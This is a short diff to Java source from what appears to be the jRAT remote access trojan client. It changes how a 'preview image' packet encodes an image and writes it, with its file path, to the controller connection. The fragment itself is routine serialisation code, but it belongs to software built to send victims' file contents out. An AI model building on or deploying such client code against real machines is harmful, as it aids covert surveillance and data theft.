@@ -4,7 +4,9 @@ import jrat.client.Connection;
 import jrat.client.packets.outgoing.OutgoingPacket;
 import jrat.common.utils.ImageUtils;
 
+import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
+import java.io.File;
 
 public class Packet43PreviewImage implements OutgoingPacket {
 
@@ -20,7 +22,7 @@ public class Packet43PreviewImage implements OutgoingPacket {
 	public void write(Connection dos) throws Exception {
 	    dos.writeLine(path);
 
-		byte[] buffer = ImageUtils.encode(image);
+		byte[] buffer = ImageUtils.encode(image, 0.75f, "png");
 		
 		dos.writeInt(buffer.length);
 		dos.write(buffer);
